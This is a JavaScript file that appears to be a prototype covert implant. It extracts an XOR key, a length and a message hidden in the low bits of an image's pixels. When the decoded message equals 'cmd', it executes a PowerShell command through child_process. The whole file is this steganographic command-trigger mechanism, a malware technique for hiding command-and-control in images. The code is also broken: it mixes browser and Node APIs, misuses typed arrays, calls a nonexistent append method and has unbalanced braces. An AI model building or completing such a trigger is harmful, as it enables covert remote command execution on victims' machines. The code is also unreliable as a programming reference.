import { exec } from 'child_process';

function bitsToBytes(arr) {
  let res = Uint8Array(arr.length/8);
  let num = 7;
  for(let i = 0; i < arr.length; i++) {
    res[Math.floor(i/8)] += arr[i] << num;
    num--;
    if (num < 0) {
      num = 7;
    }
  }
  return res;
}
document.addEventListener('DOMContentLoaded', ()  => {
    const iframe = document.getElementById("content");
    
    iframe.onload = function() {
    const innerDoc = iframe.contentDocument || iframe.contentWindow.document;
    
    innerDoc.getElementById("swap").addEventListener("click", getImg);

    function getImg() {
      const image = innerDoc.getElementById("imgDisplay");
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext('2d');

      canvas.width = image.width;
      canvas.height = image.height;

      ctx.drawImage(image, 0, 0);

      let byteArray = [];
      let key = 0;
      let length = 0;
      canvas.toBlob(blob => {
        const reader = new FileReader();
        reader.onload = function() {
          const arrayBuffer = reader.result;
          byteArray = Uint8Array(arrayBuffer);

          //get the xor key
          for (let i = 0; i<8; i++) {
            let curByte = byteArray[i+10000];
            let curKeyBit = curByte & 1;
            key += curKeyBit << (7-i);
          }

          for(let i = 0; i < 16; i++) {
            let curByte = byteArray[i+18000];
            let curLengthBit = curByte & 1;
            length += curLengthBit << (15-i);
          }

          for(let i = 0; i < length * 8; i++) {
            let curByte = byteArray[i+20000];
            let bitsArray = []
            bitsArray.append(curByte & 1);
            let encryptedMessage = bitsToBytes(bitsArray);
            encryptedMessage = encryptedMessage.map(val => val ^ key);
            const decoder = new TextDecoder();
            const output = decoder.decode(encryptedMessage);
            
            switch(output) {
              case("cmd"):
              exec('powershell.exe -Command "Get-Process"', (error, stdout, stderr) => {
              if (error) {
                console.error(`Error: ${error.message}`);
                return;
              }
              if (stderr) {
                console.error(`Stderr: ${stderr}`);
                return;
              }
              console.log(`Output:\n${stdout}`);
              });  
              break;
            }
          
        };

        // Read the Blob as ArrayBuffer
        reader.readAsArrayBuffer(blob);
      }, 'image/bmp'});
    }
  }
})